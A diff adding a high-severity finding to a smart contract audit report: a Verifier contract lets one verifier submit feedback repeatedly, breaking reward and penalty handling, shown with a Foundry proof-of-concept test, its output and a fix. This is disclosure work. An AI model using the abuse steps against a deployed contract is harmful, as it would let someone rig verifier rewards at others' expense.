@@ -485,6 +485,171 @@ function provideFeedback(
     }
 ```
 
+### [H-6] The same verifier can call multiple times `Verifier::provideFeedback` function and violate the `Verifier::_earnRewardsOrGetPenalized` function for `DIFFERENTOPINION` status
+
+**Description:**
+
+In the `Verifier` contract, the `provideFeedback` function is used to provide feedback for the evidence. However, the same selected verifier can just call multiple times this function and violate the `_earnRewardsOrGetPenalized` function for `DIFFERENTOPINION` status.
+
+```javascript
+function provideFeedback(
+        string memory feedbackIpfsHash,
+        string memory evidenceIpfsHash,
+        address user,
+        bool approved
+    ) external {
+        .
+        .
+        .
+        if (
+            s_evidenceIpfsHashToItsInfo[evidenceIpfsHash]
+                .statusApproveOrNot
+                .length < s_numWords
+        ) {
+            return;
+        } else {
+            address[] memory allSelectedVerifiers = s_evidenceIpfsHashToItsInfo[
+                evidenceIpfsHash
+            ].selectedVerifiers;
+            uint256 allSelectedVerifiersLength = allSelectedVerifiers.length;
+            StructDefinition.VSkillUserSubmissionStatus evidenceStatus = _updateEvidenceStatus(
+                    evidenceIpfsHash,
+                    user
+                );
+@>          for (uint256 i = 0; i < allSelectedVerifiersLength; i++) {
+@>              _earnRewardsOrGetPenalized(
+                    evidenceIpfsHash,
+                    allSelectedVerifiers[i],
+                    evidenceStatus
+                );
+            }
+        }
+    }
+```
+
+```javascript
+function _earnRewardsOrGetPenalized(
+        string memory evidenceIpfsHash,
+        address verifierAddress,
+        StructDefinition.VSkillUserSubmissionStatus evidenceStatus
+    ) internal {
+        .
+        .
+        .
+        // DIFFERENTOPINION
+@>      else {
+@>          s_evidenceIpfsHashToItsInfo[evidenceIpfsHash]
+@>              .statusApproveOrNot
+@>              .pop();
+
+            return;
+        }
+    }
+```
+
+Here is how the bug happens:
+
+1. The first verifier provides feedback with `true` value for three times.
+2. The second verifier provides feedback with `false` value.
+3. Once the second verifier provided the feedback, it will reach the line to pop the `statusApproveOrNot` array since already enough feedbacks are provided.
+4. Then since there are only two verifiers provide the feedback, the `statusApproveOrNot` array will not be empty. Instead it will be length of 1.
+5. Then when the third verifier provides feedback, he will not be able to trigger the line for `_earnRewardsOrGetPenalized` function, because now only the array length is only 2, not enough to meet the `NUM_WORDS` checks.
+
+**Impact:**
+
+The same verifier can call multiple times this function and violate the `_earnRewardsOrGetPenalized` function and violates the other verifiers' rewards.
+
+**Proof of Concept:**
+
+Add the following test case to `./test/verifier/uint/VerifierTest.t.sol`:
+
+<details>
+<summary>
+Proof of Code
+</summary>
+
+```javascript
+function testStatusApprovedOrNotArrayWillBePoppedEvenWhenEmpty() external {
+        _createNumWordsNumberOfSameDomainVerifier(SKILL_DOMAINS);
+
+        StructDefinition.VSkillUserEvidence memory ev = StructDefinition
+            .VSkillUserEvidence(
+                USER,
+                IPFS_HASH,
+                SKILL_DOMAINS[0],
+                StructDefinition.VSkillUserSubmissionStatus.SUBMITTED,
+                new string[](0)
+            );
+        vm.startPrank(USER);
+        verifier.submitEvidence{
+            value: verifier.getSubmissionFeeInUsd().convertUsdToEth(
+                AggregatorV3Interface(verifierConstructorParams.priceFeed)
+            )
+        }(ev.evidenceIpfsHash, ev.skillDomain);
+        vm.stopPrank();
+
+        vm.recordLogs();
+        verifier._requestVerifiersSelection(ev);
+        Vm.Log[] memory entries = vm.getRecordedLogs();
+        bytes32 requestId = entries[0].topics[2];
+        VRFCoordinatorV2Mock vrfCoordinatorMock = VRFCoordinatorV2Mock(
+            verifierConstructorParams.vrfCoordinator
+        );
+        vm.pauseGasMetering();
+        vm.recordLogs();
+        vrfCoordinatorMock.fulfillRandomWords(
+            uint256(requestId),
+            address(verifier)
+        );
+        Vm.Log[] memory entriesOfFulfillRandomWords = vm.getRecordedLogs();
+        bytes32 selectedVerifierOne = entriesOfFulfillRandomWords[1].topics[1];
+        bytes32 selectedVerifierTwo = entriesOfFulfillRandomWords[2].topics[1];
+
+        address selectedVerifierAddressOne = address(
+            uint160(uint256(selectedVerifierOne))
+        );
+        address selectedVerifierAddressTwo = address(
+            uint160(uint256(selectedVerifierTwo))
+        );
+
+        for (uint160 i = 0; i < 3; i++) {
+            vm.prank(selectedVerifierAddressOne);
+            verifier.provideFeedback(FEEDBACK_IPFS_HASH, IPFS_HASH, USER, true);
+        }
+        bool[] memory statusApproveOrNot = verifier
+            .getEvidenceToStatusApproveOrNot(IPFS_HASH);
+        console.log("Status approve or not: ", statusApproveOrNot.length);
+
+        vm.prank(selectedVerifierAddressTwo);
+        verifier.provideFeedback(FEEDBACK_IPFS_HASH, IPFS_HASH, USER, false);
+
+        bool[] memory statusApproveOrNot1 = verifier
+            .getEvidenceToStatusApproveOrNot(IPFS_HASH);
+        console.log("Status approve or not 1: ", statusApproveOrNot1.length);
+
+        assert(statusApproveOrNot1.length != 0);
+    }
+```
+
+Then run the commands below:
+
+```bash
+forge test --mt testStatusApprovedOrNotArrayWillBePoppedEvenWhenEmpty -vv
+```
+
+And you will see the console output:
+
+```bash
+  Status approve or not:  3
+  Status approve or not 1:  1
+```
+
+</details>
+
+**Recommended Mitigation:**
+
+Same as the previous issue, add some restrictions to ensure that the same verifier can only provide feedback once.
+
 ## Medium
 
 ### [M-1] No bounds check in `Verifier::checkUpkeep` for the `s_evidences` array, can cause DoS attack as the array grows
